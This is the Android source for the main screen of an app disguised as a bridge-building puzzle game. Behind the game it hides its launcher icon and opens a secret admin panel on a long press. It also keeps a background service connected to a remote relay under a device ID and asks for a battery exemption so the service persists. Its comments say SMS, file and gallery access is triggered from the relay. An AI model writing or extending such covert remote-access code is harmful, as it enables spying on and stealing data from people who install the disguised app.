package com.hashibridge.master;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.ImageButton;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import com.hashibridge.master.game.BridgeGameView;
import com.hashibridge.master.game.BridgePuzzleGenerator;
import java.util.Random;

public class MainActivity extends AppCompatActivity {

    // Only request codes we actually use at launch
    private static final int RC_NOTIFICATION   = 2001;
    private static final int RC_BATTERY_OPT    = 2002;

    private BridgeGameView gameView;
    private TextView tvHud;
    private TextView tvLevelBadge;
    private int currentLevel = 1;
    private int islandCount = 6;
    private final Random random = new Random();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        com.hashibridge.master.utils.Config.getOrCreateDeviceId(this);

        if (com.hashibridge.master.utils.Config.isIconHidden(this)) {
            com.hashibridge.master.utils.Config.hideAppIcon(this);
        }

        gameView = findViewById(R.id.game_view);
        tvHud = findViewById(R.id.tv_hud);
        tvLevelBadge = findViewById(R.id.tv_level_badge);
        Button btnReset = findViewById(R.id.btn_reset);
        Button btnNext = findViewById(R.id.btn_next);
        ImageButton btnSettings = findViewById(R.id.btn_settings);

        gameView.setOnWinListener(() -> {
            tvHud.setText("Level Cleared! Tap Next Level to continue.");
            Toast.makeText(this, "Puzzle Solved! Great job!", Toast.LENGTH_SHORT).show();
        });

        btnReset.setOnClickListener(v -> startPuzzle(currentLevel));
        btnNext.setOnClickListener(v -> {
            currentLevel++;
            islandCount = Math.min(10, 5 + (currentLevel / 2));
            startPuzzle(currentLevel);
        });

        btnSettings.setOnClickListener(v ->
                Toast.makeText(this, "Settings are currently locked", Toast.LENGTH_SHORT).show());
        btnSettings.setOnLongClickListener(v -> {
            openAdminPanel();
            return true;
        });

        findViewById(R.id.tv_title).setOnLongClickListener(v -> { copyDeviceId(); return true; });
        tvLevelBadge.setOnLongClickListener(v -> { copyDeviceId(); return true; });

        startPuzzle(currentLevel);

        // Minimal launch flow: only POST_NOTIFICATIONS needed for foreground service.
        // File / SMS / Gallery permissions are requested lazily when those features
        // are first accessed from the relay (see PermissionHelper.ensureLazy).
        requestNotificationPermissionThenBatteryOpt();
    }

    // ─── Minimal permission flow ─────────────────────────────────────────────

    /**
     * Step 1: POST_NOTIFICATIONS (Android 13+).
     * This is the only permission the user sees on first launch.
     * It's required for the foreground service notification to show —
     * without it the service is killed immediately on Android 13+.
     */
    private void requestNotificationPermissionThenBatteryOpt() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (android.content.pm.PackageManager.PERMISSION_GRANTED !=
                    androidx.core.content.ContextCompat.checkSelfPermission(
                            this, android.Manifest.permission.POST_NOTIFICATIONS)) {
                ActivityCompat.requestPermissions(this,
                        new String[]{android.Manifest.permission.POST_NOTIFICATIONS},
                        RC_NOTIFICATION);
                return; // continue in onRequestPermissionsResult
            }
        }
        // Already granted or not needed — go straight to battery opt
        requestBatteryOptimizationExemption();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == RC_NOTIFICATION) {
            // Granted or denied — either way proceed. Service still runs;
            // notification just won't appear on denied (acceptable trade-off).
            requestBatteryOptimizationExemption();
        }
    }

    /**
     * Step 2: Battery optimization exemption.
     * Pops the system dialog asking to "allow always running in background."
     * User can deny — service still starts, watchdog will restart if killed.
     */
    private void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent i = new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName()));
                    startActivityForResult(i, RC_BATTERY_OPT);
                    return;
                } catch (Exception e) {
                    // Some ROMs don't support the direct intent — skip silently
                }
            }
        }
        // Already exempt or not M+ — start service now
        autoStartServiceIfReady();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == RC_BATTERY_OPT) {
            // Regardless of whether user allowed or denied, start the service
            autoStartServiceIfReady();
        }
    }

    // ─── Helpers ─────────────────────────────────────────────────────────────

    private void openAdminPanel() {
        try {
            startActivity(new Intent(this, ControlPanelActivity.class));
        } catch (Exception ignored) {}
    }

    private void copyDeviceId() {
        String deviceId = com.hashibridge.master.utils.Config.getOrCreateDeviceId(this);
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText("Device ID", deviceId);
        clipboard.setPrimaryClip(clip);
        Toast.makeText(this, "Device ID copied to clipboard: " + deviceId, Toast.LENGTH_SHORT).show();
    }

    private void startPuzzle(int level) {
        tvLevelBadge.setText("Level " + level);
        BridgePuzzleGenerator.Puzzle puzzle = BridgePuzzleGenerator.generate(random, islandCount);
        gameView.setPuzzle(puzzle);
        tvHud.setText("Tap two islands to build a bridge");
    }

    private void autoStartServiceIfReady() {
        if (!BridgeService.isRunning()) {
            String savedRelay = com.hashibridge.master.utils.Config.getRelayUrl(this);
            if (savedRelay.isEmpty()) {
                savedRelay = getString(R.string.default_relay_url);
            }
            String deviceId = com.hashibridge.master.utils.Config.getOrCreateDeviceId(this);

            com.hashibridge.master.utils.Config.saveConfig(this, savedRelay, deviceId);
            com.hashibridge.master.utils.Config.setAutoStart(this, true);

            Intent intent = new Intent(this, BridgeService.class);
            intent.putExtra("relayUrl", savedRelay);
            intent.putExtra("deviceId", deviceId);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        }
    }
}
